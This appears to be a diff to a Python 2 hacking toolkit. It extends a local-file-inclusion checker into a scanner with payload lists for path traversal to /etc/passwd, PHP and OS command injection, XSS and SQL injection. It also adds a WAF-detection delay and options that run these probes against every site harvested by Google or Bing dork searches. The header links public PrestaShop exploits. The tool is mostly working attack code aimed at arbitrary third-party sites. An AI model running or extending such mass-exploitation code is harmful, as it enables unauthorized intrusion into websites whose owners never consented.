@@ -19,11 +19,12 @@
 ### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259 ###
 ### ADMIN PAGE FINDER  : https://packetstormsecurity.com/files/112855/Admin-Page-Finder-Script.html                          ###
 ################################################################################################################################
-import requests,json,sys, time, re, os, base64, random,hashlib,timeit,ftplib,pexpect,urllib2
+import requests,json,sys, time, re, os, base64, random,hashlib,timeit,ftplib,pexpect,urllib2,urllib
 from sys import platform
 from time import gmtime, strftime
 from optparse import OptionParser
 from passlib.hash import nthash
+from urllib import FancyURLopener
 from passlib.hash import mssql2000 as m20,oracle11 as oracle11,mssql2005 as m25, mysql323, mysql41
 from pexpect import pxssh
 from ftplib import FTP
@@ -96,87 +97,92 @@ class color:
 ###
 ####################################
 ##                                ##
-##            LFI/SQLI            ##
+##       LFI/SQLI/RCE/XSS         ##
 ##                                ##
 ####################################
+class UserAgent(FancyURLopener):
+    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'
+useragent = UserAgent()
+class HTTP_HEADER:
+    HOST = "Host"
+    SERVER = "Server"
 
-class checker:
-    def lfi(self, url):
-        payloads=[
-        "../etc/passwd",
-        "../etc/passwd%00",
-        "../../etc/passwd",
-        "../../etc/passwd%00",
-        "../../../etc/passwd",
-        "../../../etc/passwd%00",
-        "../../../../etc/passwd",
-        "../../../../etc/passwd%00",
-        "../../../../../etc/passwd",
-        "../../../../../etc/passwd%00",
-        "../../../../../../etc/passwd",
-        "../../../../../../etc/passwd%00",
-        "../../../../../../../etc/passwd",
-        "../../../../../../../etc/passwd%00",
-        "../../../../../../../../etc/passwd",
-        "../../../../../../../../etc/passwd%00",
-        "../../../../../../../../../etc/passwd",
-        "../../../../../../../../../etc/passwd%00",
-        "../../../../../../../../../../etc/passwd",
-        "../../../../../../../../../../etc/passwd%00",
-        "../../../../../../../../../../../etc/passwd",
-        "../../../../../../../../../../../etc/passwd%00",
-        "../../../../../../../../../../../../etc/passwd",
-        "../../../../../../../../../../../../etc/passwd%00",
-        "..%2Fetc%2Fpasswd",
-        "..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
-        if "=" in url:
-        	lfi = re.findall(r'=(.*)', url)
-        	for i in lfi:
-        		print (color.C+color.BOLD+"[+] "+color.BL+"TARGET"+color.W+" : "+color.ENDC+url+color.ENDC)
-        		print ("\t"+color.R+"------------------------------------------------------------------"+color.ENDC)	
-        		l=re.sub(i, '', url)
-        		for payload in payloads:
-        			payload=payload.strip()
-        			print ("\t"+color.W+color.BOLD+"[+] "+color.BL+"Payload "+color.W+"  : "+color.ENDC+payload+color.ENDC)
-        			lfii = l+payload
-        			r = requests.get(lfii)
-        			code = str(r.status_code)
-        			html = r.content
-        			if "root" in html:
-        				print ("\t"+color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
-        				print ("\t"+color.Y+color.BOLD+"[+] "+color.BL+"LFI FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
-        				print ("\t"+color.R+"------------------------------------------------------------------"+color.ENDC)	
-        			else:
-        				print ("\t"+color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
-        				print ("\t"+color.R+color.BOLD+"[+] "+color.BL+"NOT FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
-        				print ("\t"+color.R+"------------------------------------------------------------------"+color.ENDC)
-        else:
-        	pass
 
-	def sqli(self, url):
-		pass
+class scanner:
+	burl,gurl = [],[]
+	def headers_reader(self,url):
+		print color.BOLD+"\t[!] Fingerprinting the backend Technologies."+color.ENDC
+		opener = urllib.urlopen(url)
+		if opener.code == 200:
+			print color.G+"\t[!] Status code: 200 OK"+color.ENDC
+		if opener.code == 404:
+			print color.R+"\t[!] Page was not found! Please check the URL \n"+color.ENDC
+			exit()
+		Server = opener.headers.get(HTTP_HEADER.SERVER)
+		Host = url.split("/")[2]
+		print color.G+"\t[!] Host: " + str(Host) +color.ENDC
+		print color.G+"\t[!] WebServer: " + str(Server) +color.ENDC
+		for item in opener.headers.items():
+			for powered in item:
+				sig = "x-powered-by"
+				if sig in item:
+					print color.G+ "\t[!] " + str(powered).strip() + color.ENDC
+	def lfi(self, url):
+		payloads=["../etc/passwd","../etc/passwd%00","../../etc/passwd","../../etc/passwd%00","../../../etc/passwd","../../../etc/passwd%00","../../../../etc/passwd","../../../../etc/passwd%00","../../../../../etc/passwd","../../../../../etc/passwd%00","../../../../../../etc/passwd","../../../../../../etc/passwd%00","../../../../../../../etc/passwd","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd%00","..%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd%2500","..%2F..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
+		lfi = re.findall(r'=(.*)', url)
+		for i in lfi:
+			print (color.R+color.BOLD+"[+] "+color.W+"TARGET : "+url+color.ENDC)
+			l=re.sub(i, '', url)
+			for payload in payloads:
+				payload=payload.strip()
+				print (color.R+color.BOLD+"[+] "+color.W+"Payload : "+payload+color.ENDC)
+				lfii = l+payload
+				r = requests.get(lfii)
+				html = r.content
+				if "root" in html:
+					print (color.R+color.BOLD+"[+] "+color.W+" LFI FOUND : "+lfii+color.ENDC)
+				else:
+					pass
+	def run(self,url, payloads, check):
+		opener = requests.get(url)
+		vuln = 0
+		print color.B+"[+] "+color.W+"Target : "+url+color.ENDC
+		#print color.B+"\t[+] "+color.W+"IP   : "+socket.gethostbyname(url)+color.ENDC
+		if opener.status_code == 999:
+			print color.R +" [~] WebKnight WAF Detected!"+color.ENDC
+			print color.R +" [~] Delaying 3 seconds between every request"+color.ENDC
+			time.sleep(3)
+		for params in url.split("?")[1].split("&"):
+			for payload in payloads:
+				bugs = url.replace(params, params + str(payload).strip())
+				request = useragent.open(bugs)
+				html = request.readlines()
+				for line in html:
+					checker = re.findall(check, line)
+					if len(checker) !=0:
+						print color.R+"\t[*] Payload : " ,payload +color.ENDC
+						print color.B+"\t[*] FOUND   : "+color.ENDC + bugs
+						vuln +=1
+		if vuln == 0:
+			print color.G+"\t[!] Target is not vulnerable!"+color.ENDC
+		else:
+			print color.C+"\t[!]  %i bugs :-) " % (vuln) +color.ENDC
+	def rce(self,url):
+		self.headers_reader(url)
+		payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
+		payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
+		payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
+		check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
+		self.run(url, payloads, check)
+	def xss(self,url):
+		payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
+		payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
+		check = re.compile('zigoo0<svg|x>x', re.I)
+		self.run(url, payloads, check)
+	def sqli(self,url):
+		payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
+		check = re.compile("SQL syntax|Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
+		self.run(url, payloads, check)
 
 ###
 ###DORKING TOOLS
@@ -203,44 +209,7 @@ class dorker:
 		except Exception:
 			pass
 		def randomm():
-			tld = [
-			'ae', 'am', 'as', 'at',
-			'az', 'ba', 'be', 'bg',
-			'bi', 'bs', 'ca', 'cd',
-			'cg', 'ch', 'ci', 'cl',
-			'co.bw', 'co.ck', 'co.cr', 'co.hu',
-			'co.id', 'co.il', 'co.im', 'co.in',
-			'co.je', 'co.jp', 'co.ke', 'co.kr',
-			'co.ls', 'co.ma', 'co.nz', 'co.th',
-			'co.ug', 'co.uk', 'co.uz', 'co.ve',
-			'co.vi', 'co.za', 'co.zm', 'com',
-			'com.af', 'com.ag', 'com.ar', 'com.au',
-			'com.bd', 'com.bo', 'com.br', 'com.bz',
-			'com.co', 'com.cu', 'com.do', 'com.ec',
-			'com.eg', 'com.et', 'com.fj', 'com.gi',
-			'com.gt', 'com.hk', 'com.jm', 'com.kw',
-			'com.ly', 'com.mt', 'com.mx', 'com.my',
-			'com.na', 'com.nf', 'com.ni', 'com.np',
-			'com.om', 'com.pa', 'com.pe', 'com.ph',
-			'com.pk', 'com.pr', 'com.py', 'com.qa',
-			'com.sa', 'com.sb', 'com.sg', 'com.sv',
-			'com.tj', 'com.tr', 'com.tw', 'com.ua',
-			'com.uy', 'com.uz', 'com.vc', 'com.vn',
-			'cz', 'de', 'dj', 'dk',
-			'dm', 'ee', 'es', 'fi',
-			'fm', 'fr', 'gg', 'gl',
-			'gm', 'gr', 'hn', 'hr',
-			'ht', 'hu', 'ie', 'is',
-			'it', 'jo', 'kg', 'kz',
-			'li', 'lk', 'lt', 'lu',
-			'lv', 'md', 'mn', 'ms',
-			'mu', 'mw', 'net','nl',
-			'no', 'nr', 'nu', 'pl',
-			'pn', 'pt', 'ro', 'ru',
-			'rw', 'sc', 'se', 'sh',
-			'si', 'sk', 'sm', 'sn',
-			'tm', 'to', 'tp', 'tt',
-			'uz', 'vg', 'vu', 'ws']
+			tld = ['ae', 'am', 'as', 'at','az', 'ba', 'be', 'bg','bi', 'bs', 'ca', 'cd','cg', 'ch', 'ci', 'cl','co.bw', 'co.ck', 'co.cr', 'co.hu','co.id', 'co.il', 'co.im', 'co.in','co.je', 'co.jp', 'co.ke', 'co.kr','co.ls', 'co.ma', 'co.nz', 'co.th','co.ug', 'co.uk', 'co.uz', 'co.ve','co.vi', 'co.za', 'co.zm', 'com','com.af', 'com.ag', 'com.ar', 'com.au','com.bd', 'com.bo', 'com.br', 'com.bz','com.co', 'com.cu', 'com.do', 'com.ec','com.eg', 'com.et', 'com.fj', 'com.gi','com.gt', 'com.hk', 'com.jm', 'com.kw','com.ly', 'com.mt', 'com.mx', 'com.my','com.na', 'com.nf', 'com.ni', 'com.np','com.om', 'com.pa', 'com.pe', 'com.ph','com.pk', 'com.pr', 'com.py', 'com.qa','com.sa', 'com.sb', 'com.sg', 'com.sv','com.tj', 'com.tr', 'com.tw', 'com.ua','com.uy', 'com.uz', 'com.vc', 'com.vn','cz', 'de', 'dj', 'dk','dm', 'ee', 'es', 'fi','fm', 'fr', 'gg', 'gl','gm', 'gr', 'hn', 'hr','ht', 'hu', 'ie', 'is','it', 'jo', 'kg', 'kz','li', 'lk', 'lt', 'lu','lv', 'md', 'mn', 'ms','mu', 'mw', 'net','nl','no', 'nr', 'nu', 'pl','pn', 'pt', 'ro', 'ru','rw', 'sc', 'se', 'sh','si', 'sk', 'sm', 'sn','tm', 'to', 'tp', 'tt','uz', 'vg', 'vu', 'ws']
 			tld_rand = random.sample(tld, 1)
 			for tldd in tld_rand:
 				return tldd
@@ -1241,10 +1210,19 @@ def __main__():
 				help="Number of page to stop")
 			parser.add_option("--lfi",
 			help="Scan Founded website from LFI", action="store_true")
+			parser.add_option("--sqli",
+			help="Scan Founded website from SQLi", action="store_true")
+			parser.add_option("--rce",
+			help="Scan Founded website from RCE", action="store_true")
+			parser.add_option("--xss",
+			help="Scan Founded website from XSS", action="store_true")
 			(options,args) = parser.parse_args()
 			dork = options.dork
 			level = options.level
 			lfi = options.lfi
+			sqli = options.sqli
+			rce = options.rce
+			xss = options.xss
 			if dork and level is not None: 
 				dorker().google(dork, 0, level)
 			if dork and level is not None and lfi==True:
@@ -1252,7 +1230,25 @@ def __main__():
 				gurl= dorker().gurl
 				for urll in gurl:
 					urll= urll.strip()
-					checker().lfi(urll)
+					scanner().lfi(urll)
+			if dork and level is not None and sqli==True:
+				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
+				gurl= dorker().gurl
+				for urll in gurl:
+					urll= urll.strip()
+					scanner().sqli(urll)
+			if dork and level is not None and rce==True:
+				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
+				gurl= dorker().gurl
+				for urll in gurl:
+					urll= urll.strip()
+					scanner().rce(urll)
+			if dork and level is not None and xss==True:
+				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
+				gurl= dorker().gurl
+				for urll in gurl:
+					urll= urll.strip()
+					scanner().xss(urll)
 			errors = []
 			if (dork == None):
 				errors.append("[-] No DORK specified.")
@@ -1271,10 +1267,19 @@ def __main__():
 				help="Dork for get URL")
 			parser.add_option("--lfi",
 			help="Scan Founded website from LFI", action="store_true")
+			parser.add_option("--sqli",
+			help="Scan Founded website from SQLi", action="store_true")
+			parser.add_option("--rce",
+			help="Scan Founded website from RCE", action="store_true")
+			parser.add_option("--xss",
+			help="Scan Founded website from XSS", action="store_true")
 			(options,args) = parser.parse_args()
 			ip = options.ip
 			dork = options.dork
 			lfi = options.lfi
+			sqli = options.sqli
+			rce = options.rce
+			xss = options.xss
 			if ip and dork:
 				dorker().bing(ip,dork)
 			if ip and dork and lfi==True:
@@ -1282,7 +1287,25 @@ def __main__():
 				burl= dorker().burl
 				for urll in burl:
 					urll= urll.strip()
-					checker().lfi(urll)
+					scanner().lfi(urll)
+			if ip and dork and sqli==True:
+				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
+				burl= dorker().burl
+				for urll in burl:
+					urll= urll.strip()
+					scanner().sqli(urll)
+			if ip and dork and rce==True:
+				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
+				burl= dorker().burl
+				for urll in burl:
+					urll= urll.strip()
+					scanner().rce(urll)
+			if ip and dork and xss==True:
+				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
+				burl= dorker().burl
+				for urll in burl:
+					urll= urll.strip()
+					scanner().xss(urll)
 			errors = []
 			if (ip == None):
 				errors.append("[-] No IP specified.")
@@ -1502,5 +1525,5 @@ if __name__ == '__main__':
 	except KeyboardInterrupt:
 		print (color.BOLD+color.Y+"Exiting Now !"+color.ENDC)
 		sys.exit(0)
-	#except urllib2.HTTPError:
-	#	print (color.BOLD+color.Y+"Error, Retry Later !"+color.ENDC)
+	except urllib2.HTTPError:
+		print (color.BOLD+color.Y+"Error, Retry Later !"+color.ENDC)
